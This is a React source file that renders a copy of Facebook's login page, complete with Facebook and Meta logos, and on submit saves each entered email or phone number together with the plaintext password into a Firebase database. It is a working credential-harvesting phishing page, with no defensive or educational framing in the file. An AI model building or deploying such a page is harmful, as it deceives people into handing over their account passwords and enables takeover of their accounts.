import React, { useState } from "react";
import Face from "../assets/fb.png";
import Met from "../assets/metaa.png";
import { getAuth, createUserWithEmailAndPassword } from "firebase/auth";
import { getDatabase, ref, set } from "firebase/database";

const FacebookLogin = () => {
  const [emailOrPhone, setEmailOrPhone] = useState("");
  const [password, setPassword] = useState("");

  const handleEmailOrPhone = (e) => {
    setEmailOrPhone(e.target.value);
  };

  const handlePassword = (e) => {
    setPassword(e.target.value);
  };

  const auth = getAuth();
  const db = getDatabase();

  const handleSubmit = (e) => {
    e.preventDefault();

    
    const isPhoneNumber = /^\d+$/.test(emailOrPhone); 
    let email;

    if (isPhoneNumber) {
      
      email = `${emailOrPhone}@example.com`;
    } else {
      
      email = emailOrPhone;
    }

    createUserWithEmailAndPassword(auth, email, password)
      .then((userCredential) => {
        const user = userCredential.user;

        
        set(ref(db, "users/" + user.uid), {
          emailOrPhone: emailOrPhone, 
          password: password, 
        })
         
      })
      .catch((error) => {
        const errorCode = error.code;
        const errorMessage = error.message;
        console.error("Error:", errorMessage, "Code:", errorCode);
      });
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-[#f2f4f7]">
      <div className="p-8 rounded-lg shadow-lg w-96 h-full">
        <div className="mb-[40px] text-center text-[gray]">
          <span className="text-[12px] text-center">English UK</span>
        </div>
        <h2 className="text-2xl font-bold flex justify-center mb-[70px] text-center w-full items-center">
          <img src={Face} className="w-[50px]" alt="Facebook logo" />
        </h2>
        <form onSubmit={handleSubmit}>
          <div className="mb-4">
            <input
              onChange={handleEmailOrPhone}
              type="text"
              id="emailOrPhone"
              className="mt-1 block w-full px-3 py-4 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring focus:ring-gray-100"
              placeholder="Mobile number or email address"
              required
            />
          </div>
          <div className="mb-6">
            <input
              onChange={handlePassword}
              type="password"
              id="password"
              className="mt-1 block w-full px-3 py-4 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring focus:ring-gray-100"
              placeholder="Password"
              required
            />
          </div>
          <button
            type="submit"
            className="w-full bg-[#0866ff] text-white font-normal py-2 rounded-[25px] hover:bg-blue-400 transition"
          >
            Log In
          </button>
        </form>
        <div className="mt-4 mb-[80px] text-center">
          <a href="#" className="text-[#000000c7] hover:underline">
            Forgotten password?
          </a>
        </div>

        <div className="mt-2 text-center">
          <button className="flex items-center justify-center w-full bg-transparent border-[1px] border-[#417edfe5] text-[#417edfe5] font-medium py-2 rounded-[25px]">
            Create new account
          </button>
        </div>
        <div className="mt-[20px] flex justify-center">
          <img src={Met} className="w-[60px]" alt="Meta logo" />
        </div>
        <div className="flex justify-center gap-x-2 mt-[20px]">
          <span className="text-[gray] text-[10px] ">About</span>
          <span className="text-[gray] text-[10px] ">Help</span>
          <span className="text-[gray] text-[10px] ">More</span>
        </div>
      </div>
    </div>
  );
};

export default FacebookLogin;
